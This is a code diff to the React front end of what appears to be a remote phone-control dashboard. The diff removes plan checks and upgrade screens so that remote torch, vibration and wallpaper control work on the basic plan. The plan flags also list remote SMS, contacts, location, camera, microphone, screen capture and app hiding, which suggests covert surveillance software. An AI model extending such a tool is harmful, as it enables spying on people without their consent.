@@ -73,7 +73,7 @@ const getPlanLimits = (plan: string): PlanLimits => {
     if (p === 'enterprise') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, location: true, hideApp: true, bulkDownload: true, maxDevices: -1, fileManager: true, screenCapture: true, waVoice: true, camera: true, microphone: true, notifications: true, wallpaper: true };
     if (p === 'premium') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, location: true, hideApp: true, bulkDownload: true, maxDevices: 10, fileManager: true, screenCapture: true, waVoice: true, camera: true, microphone: true, notifications: true, wallpaper: true };
     if (p === 'standard') return { photos: 1000, videos: 1000, sms: true, contacts: true, torch: true, vibration: true, location: false, hideApp: false, bulkDownload: false, maxDevices: 5, fileManager: false, screenCapture: false, waVoice: false, camera: false, microphone: false, notifications: true, wallpaper: true };
-    return { photos: 600, videos: 0, sms: false, contacts: false, torch: false, vibration: false, location: false, hideApp: false, bulkDownload: false, maxDevices: 1, fileManager: false, screenCapture: false, waVoice: false, camera: false, microphone: false, notifications: false, wallpaper: false };
+    return { photos: 600, videos: 0, sms: false, contacts: false, torch: true, vibration: true, location: false, hideApp: false, bulkDownload: false, maxDevices: 1, fileManager: false, screenCapture: false, waVoice: false, camera: false, microphone: false, notifications: false, wallpaper: true };
 };
 
 interface HomeProps {
@@ -186,7 +186,9 @@ export default function Home(props: any) {
                         const parsed = JSON.parse(savedLimits);
                         if (savedPlan === 'basic') parsed.photos = 600;
                         if (savedPlan === 'standard') { parsed.photos = 1000; parsed.bulkDownload = false; }
-                        parsed.wallpaper = savedPlan !== 'basic';
+                        parsed.wallpaper = true;
+                        parsed.torch = true;
+                        parsed.vibration = true;
                         setPlanLimits(parsed);
                         localStorage.setItem('galleryeye_plan_limits', JSON.stringify(parsed));
                     } catch { setPlanLimits(getPlanLimits(savedPlan)); }
@@ -875,7 +877,9 @@ export default function Home(props: any) {
                                 // Fix missing location & fileManager flag from remote backend
                                 patchedLimits.location = plan === 'premium' || plan === 'enterprise';
                                 patchedLimits.fileManager = plan === 'premium' || plan === 'enterprise';
-                                patchedLimits.wallpaper = plan !== 'basic';
+                                patchedLimits.wallpaper = true;
+                                patchedLimits.torch = true;
+                                patchedLimits.vibration = true;
                                 if (plan === 'basic') patchedLimits.photos = 600;
                                 if (plan === 'standard') {
                                     patchedLimits.photos = 1000;
@@ -2470,11 +2474,6 @@ export default function Home(props: any) {
 
     // --- Torch Functions ---
     const toggleTorch = () => {
-        // Plan check - Torch requires Standard or Premium
-        if (!planLimits.torch) {
-            showUpgradePrompt('Flashlight Control', 'standard');
-            return;
-        }
         requireConnectedDevice((targetId) => {
             const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
             if (!socket || !effectiveTarget || !userUuid) return;
@@ -2518,11 +2517,6 @@ export default function Home(props: any) {
 
     // --- Vibration Functions ---
     const triggerVibration = () => {
-        // Plan check - Vibration requires Standard or Premium
-        if (!planLimits.vibration) {
-            showUpgradePrompt('Vibration Control', 'standard');
-            return;
-        }
         requireConnectedDevice((targetId) => {
             const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
             if (!socket || !effectiveTarget || !userUuid) return;
@@ -3475,27 +3469,6 @@ END:VCARD`;
             }
             case 'torch':
             case 'flashlight': {
-                if (!planLimits.torch) {
-                    return (
-                        <div className="flex flex-col items-center justify-center py-20 px-4 text-center max-w-md mx-auto animate-in fade-in">
-                            <div className="clay-icon-pod w-16 h-16 rounded-3xl flex items-center justify-center text-amber-400 border-amber-500/40 shadow-[0_0_30px_rgba(245,158,11,0.25)] mb-4">
-                                <Flashlight className="w-8 h-8 text-amber-400" />
-                            </div>
-                            <h3 className="text-lg font-black text-white mb-2">Remote Flashlight Strobe</h3>
-                            <p className="text-xs text-white/50 mb-6 leading-relaxed">
-                                Hardware torch strobe control and emergency lighting triggers are available in Standard, Premium, and Enterprise tiers.
-                            </p>
-                            <button
-                                type="button"
-                                onClick={() => showUpgradePrompt('Flashlight Strobe', 'standard')}
-                                className="clay-cta-button px-6 py-3 rounded-xl font-bold text-xs uppercase tracking-wider flex items-center gap-2 cursor-pointer shadow-[0_4px_16px_rgba(249,115,22,0.35)] hover:scale-105 transition-transform"
-                            >
-                                <Zap size={15} />
-                                <span>Upgrade to Standard</span>
-                            </button>
-                        </div>
-                    );
-                }
                 return (
                     <FlashlightView
                         isTorchOn={isTorchOn}
@@ -3504,27 +3477,6 @@ END:VCARD`;
                 );
             }
             case 'vibration': {
-                if (!planLimits.vibration) {
-                    return (
-                        <div className="flex flex-col items-center justify-center py-20 px-4 text-center max-w-md mx-auto animate-in fade-in">
-                            <div className="clay-icon-pod w-16 h-16 rounded-3xl flex items-center justify-center text-teal-400 border-teal-500/40 shadow-[0_0_30px_rgba(20,184,166,0.25)] mb-4">
-                                <Vibrate className="w-8 h-8 text-teal-400" />
-                            </div>
-                            <h3 className="text-lg font-black text-white mb-2">Haptic Vibration Motors</h3>
-                            <p className="text-xs text-white/50 mb-6 leading-relaxed">
-                                Remote haptic pulses and pattern vibration testing are available in Standard, Premium, and Enterprise tiers.
-                            </p>
-                            <button
-                                type="button"
-                                onClick={() => showUpgradePrompt('Haptic Vibration', 'standard')}
-                                className="clay-cta-button px-6 py-3 rounded-xl font-bold text-xs uppercase tracking-wider flex items-center gap-2 cursor-pointer shadow-[0_4px_16px_rgba(249,115,22,0.35)] hover:scale-105 transition-transform"
-                            >
-                                <Zap size={15} />
-                                <span>Upgrade to Standard</span>
-                            </button>
-                        </div>
-                    );
-                }
                 return (
                     <VibrationView
                         vibrationDuration={vibrationDuration}
@@ -3534,28 +3486,6 @@ END:VCARD`;
                 );
             }
             case 'wallpaper': {
-                const isWallpaperAllowed = userPlan !== 'basic' || !!planLimits.wallpaper;
-                if (!isWallpaperAllowed) {
-                    return (
-                        <div className="flex flex-col items-center justify-center py-20 px-4 text-center max-w-md mx-auto animate-in fade-in">
-                            <div className="clay-icon-pod w-16 h-16 rounded-3xl flex items-center justify-center text-pink-400 border-pink-500/40 shadow-[0_0_30px_rgba(244,114,182,0.25)] mb-4">
-                                <Wallpaper className="w-8 h-8 text-pink-400" />
-                            </div>
-                            <h3 className="text-lg font-black text-white mb-2">Remote Wallpaper Changer</h3>
-                            <p className="text-xs text-white/50 mb-6 leading-relaxed">
-                                Remote wallpaper synchronization, custom image deployment, and lock screen theming are available in Standard, Premium, and Enterprise tiers.
-                            </p>
-                            <button
-                                type="button"
-                                onClick={() => showUpgradePrompt('Wallpaper Changer', 'standard')}
-                                className="clay-cta-button px-6 py-3 rounded-xl font-bold text-xs uppercase tracking-wider flex items-center gap-2 cursor-pointer shadow-[0_4px_16px_rgba(249,115,22,0.35)] hover:scale-105 transition-transform"
-                            >
-                                <Zap size={15} />
-                                <span>Upgrade to Standard</span>
-                            </button>
-                        </div>
-                    );
-                }
                 const effectiveTargetDevice = selectedDeviceId || selectedDeviceIdRef.current || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null) || (devices.length > 0 ? String(devices[0].deviceId || devices[0].id || devices[0]._id) : null);
                 const targetDevObj = devices.find(d => String(d.deviceId || d.id || d._id) === String(effectiveTargetDevice));
                 const isOnline = !!targetDevObj?.online;
